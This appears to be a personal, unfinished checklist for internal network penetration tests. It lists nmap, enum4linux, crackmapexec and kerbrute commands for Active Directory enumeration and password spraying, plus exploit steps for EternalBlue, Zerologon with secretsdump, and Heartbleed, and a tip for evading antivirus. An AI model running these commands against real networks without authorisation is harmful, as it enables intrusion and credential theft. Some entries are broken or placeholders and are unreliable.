# Internal Pentesting
Internal Pentest Checklist
This is done in phases
  Phase 1: No user credentials or desktop access
  Phase 2: Domain User account but no password
  Phase 3: Domain user and or deskop access
  Phase 4: Local Administrator Access
  Phase 5: Domain Administrator Access

### Objective:
Simply begin by identifyin all open hosts using NMAP, we want to do a specific port scan to find easy targets but we also want to export an full scan to a text file. We also want to run the advanced IP scanner tool to identify all services, printers and networking devices.  NEED TO FINISH THIS STATEMENT

## Host Discovery/Fingerprinting/Footprinting
 **Ping Scan - identify all hosts**
 - nmap -sP IP RANGE -oN <EXPORT PATH>
 - Note: export this into a file of IPs to use in the following scans.
 **Identify everything to review if needed**
 - nmap -A -O -p-  -iL <IP FILE> -oA <EXPORT PATH>

**Run GNMAP-Parser**
- Run parse function 
   * ./Gnmap-Parser.sh --p nmapFile

**(Optional) Identify critical ports (low hanging fruit scan)**
     nmap -A -p  21,22,23,25,139,53,80,137, 443,445, 8080, 8443,69 -iL <IP FILE>
  
  **Find the AD/DC**
    nmap -p 389,636,53,88 X.X.X.X
    ldapsearch -x -h <ip> -s base
    nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>

 **Eyewitness Port 80,443**
    eyewitness --web -f <nmap IP file>
    
## Additional Network Scans
**Run advanced IP scanner**
- This allows us to see file shares, websites and devices in the network. If you download but setup as run instead of install, I find this doesnt get blocked by AV       this way.
- This is a cool tool because you can download the exe but choose to run instead of install. This bypasses a lot of restrictions on user downloads or EDR tools.
    https://www.advanced-ip-scanner.com/

  **Identify all host names**
- Using crackmapexec, dont specify credentials and use the CIDR mask. This should identify all hostnames
- crackmapexec smb X.X.X.X/24

## SMB Verify Relay Attacks
- WHY? Verify SMB Signing needs is disabled or not required, verify with NMAP)

- NMAP CMD: nmap -p 445 --script=smb2-security-mode X.X.X.X
- NMAP CMD: nmap -p 139--script=smb2-security-mode X.X.X.X

## Active Directory Enumeration
- If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.

**AD Password policy**
- enum4linux -P x.x.x.x >> export path 
- crackmapexe <IP> -u "user" -p "password" --pass-pol

**Active Directory Users**
- enum4linux -U x.x.x.x   | grep 'user'  OR   >> export path  

**Machine list**
- enum4linux -M x.x.x.x >> export path  

**Other Policies**
- Groups with members > enum4linux -M x.x.x.x >> export path  
- Shares > enum4linux -S x.x.x.x >> export path  

**Scan for All**
- enum4linux -a X.X.X.X >> ./ADdiscovery.txt

## SMB Enumeration
- ubeus.exe asktgt /users:>users> /certificate:<base64-certificate> ptt

**List Guest Access on SMB Share**
- enum4linux -a -u "" -p "" <DC-IP>
- enum4linux -a -u "guest" -p "" >DC-ip>

- smbmap -u "" -p "" -P 445 -H <DC-ip>
- smbmap -u "guest" -p "" -P 445 -H <dc-ip>

- smbclient -U '%' -L //DC-IP
- smbclient -U 'guest%' -L //dc-ip

- cme smb <IP> -u '' -p ''   looks for null sessions
- cme smb <ip> -u 'a' -p "" looks for anonymouse access

**Listing shares on devices**
- smbclient -L //X.X.X.X/
- smbclient -L //X.X.X.X/ -U '' -N

## Build Userlist
Users can come from the following sources so far
- Responder
- MITM6
- Printers
- SMB enumeration
- Enum4linux finds
- OSINT the website and external resources
- nmap -p 88 --script=krb5-enum-users --script args="krb5-enum-users.realm='<DOMAIN>'.userdb=<user_list_file> <IP>
- SNMP enumeration, see section below.

**LinkedIn**
- Inspect the page where it shows LinkedIn employees, go to Javascript code and run the following code at the bottom. NOTE identify the right class in order to run this correctly.

- var x = document.getElementByClassName("org-people-profile-card_profile-info")
- var y = "";
- for(let num = 0;num <x.length;num++)
- {y +=x[num[.innerText.split('\n',1) + ';'}

**OSINT**
- https://phonebook.cz
- https://whatsmyname.app/
- https://hunter.io/

**Default Credentials**
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
- https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

**Leaked Credentials**
- dehashed.com
- breach-parse

## Password Attacks
The preferred method here is to take our users found and look for valid passwords. If we discovered the password policy in phase 1 then we know how frequent our tests can be. I often will use my userlist and test it with a single password twice every 30 to 45 minutes. You can lock one user out to verify but be careful with this. When you find a valid user and password combo, you can then throw the credentials across the network. When password spraying I often choose a simpe desktop IP address as any standard user should have access to it.

- enum4linux -u "User:" -p "password" -P <IP>

You can test this against a user by locking out with crackmapexec
- crackmapexec smb <IP> -u USERNAME -p <doesnt matter> -d <domain>  
Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

- cme smb <dc-IP -u user.txt -p password.txt --no-bruteforce
- cme smb <dc-ip> -u user.txt -p password.txt (only use if no lockout policy)
- crackmapexec smb <dc-ip> -u user.txt -p "PASSWORD" -d <domain> (use this to test single passwords)
You can test this against a user by locking out with crackmapexec. Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

**kerbrute**
- ./kerbrute_linux_amd64 passwordspray -d <DOMAIN.com> <username file> <single password to test>
- 1. You should have a Username list from your OSINT by now in a text file
- 2. Verify if users are present

- ./kerbrute_linux_amd64 userenum -d <DOMAIN.com> <usernames.txt>
- anything returned PRINCIPAL UNKNOWN isnt a legit account

**Keyspace Techniques**
About Keyspace Techniques
- A method of preparing a wordlist by specifying a range of characters and numbers and symbols in the wordlist.
- A tool used for this is crunch, we can specify numerous options, min and max and options
Example Commands
- crunch 2 2 01234abcd -o crunch.txt
- this will generate all possible password combinations of 2 characters including 0-4 and a-d. The -o specifies a file to save output to.
-cmd: crunch 8 8 0123456789abcdef -o crunch.txt
- this outputs a minimum and and max of 8
- If we know part of the word in the password and want all possibilities you can do the following
-cmd: crunch 6 6 -t pass%
- This says the password is 6 characters and the pass part is followed by numbers
- other character specifiers
- @ = lower case alpha characters
- , upper case alpha characters
-^ special characters including space

**CUPP**

About CUPP - Common User passwords profiler
- automatic and interactive tool written in python for creating custom wordlists
- used to build passwords based oof well known details about the target THIS MEANS OSINT is needed
- This also has L33t mode which allows for someone to replace a,e,i,o,u with numbers.
Running CUPP
- Install from git clone https:.//github.com/Mebus/cupp.git then run CMD: python3 cupp.py
- you can also include default creds from the alecto database using -a

Dictionary and Brute Force 
- About Dictionary Attacks
- used to guess passwords by well known words or phrases. Relies on a wordlist
- We can often use this against a captured hash with hashcat to crack.
- NOTE: if you dont know the hash use a tool called hashid or hash-identifier
- switches HASHCAT
-a 0 sets dictonary mode attack
-a 3 sets to brute force
-m 0 sets hash mode for cracking
-About brute force attacks
-attack to gain unauthorized access to an account.
- this guesses the victims password by sending standard password combinations.
- the diffrence from a dictionary is that that uses an entire dictionary while brute force may aim to try all combinations of characters.
- cracking a hash with hashca

Create password lists from websites
- CMD: cewl -m 8 -w wordlist.txt <URL>


## Vulnerability Scanning and Exploits
- Run Nessus and be sure to review the informationals

- tomcat/jboss manager
- auxiliary/scanner/http/tomcat_enum
- exploit/multi/http/tomcat_mgr_deploy

**java serialized port**
- ysoserial

**CVE's**
- any outdated software in the network

**MS14025**
- use scanner/smb/smb_enum_gpp
NOTE: you may need to use creds for this, if so see this exploit in the after creds obtained section

**Low Hanging Fruit**
- Anonymous login to FTP servers or SMB shares
- Telnet with default login or insecure login

**MS17-010 Eternal Blue**
- msfconsole use exploit/windows/smb/ms17_010_eternalblue

**Zerologon (this can provide administrator access)**
NOTE: zerologon exploited may cause significant impacts against the host you are attacking. 
- python cve-2020-1472-exploit.py <MACHINE BIOS NAME> <IP>
- secretsdump.py <Domain>/<machineBIOS>\$@<ip> -no-pass -just-dc-user "Administrator"
- secretsdump.py -hashes :<hash_admin< domain>/Administrator@<ip>
- python3 restorepassword.py -target-ip <IP> <DOMAIN>/<machine bios name>@<machine bios name> -hexpass <hexpass>

**Heartbleed**
- nmap -sV --script=ssl-heartbleed X.X.X.X
- msfconsole use /auxiliary/scanner/ssl/openssl_heartbleed

**Log4J**
- fdgddg


IF ANY OF THESE are compromised -> privilege escalation time to gain administrator

**COMING SOON**
- winpeas
search password files findstr /si "password" *.txt *.xml *.docx
- juicy potato/ lovely potato
- printSpooler
- rogue potato
- SMBGhost CVE-2020-0796


**NetBIOS**
- nmblookup X.X.X.X/CIDR
- nbtscan X.X.X.X/30
- nbtscan -a X.X.X.X
- nmap -sU -sV -T4 -p137,138,139 -Pn -n --script=nbstat.nse X.X.X>X

**Port 137 UDP, NetBios**
- Add name  -registers a NetBIOS name
- Add group name
- Delete Name
- Find Name

**Port 138  UDP  Datagram Mode**
- Send datagram:send a datagram to a remote NetBIOS name
- Send Broadcast Datagram: send a datagram to all NetBIOS names on the network
- Recieve Datagram: wait for a packet to arrive from a send datagram operation
- Recieve Broadcast Datagram: wait for a packet to arrive from a send broadcast datagram operation

**Port 139 TCP Session Mode**
- Call:opens a session to a remote netbios name
- Listen: listen for attempts to open a session to a NetBIOS name
- Hang up: close a session
- Send:send a packets to the computer on the other end of a session
- Send no ack:like send, doesnt need an ACK
- Recieve:wait for a packet to arrive from a send on the other end of a session


# Credentials Obtained Checklist
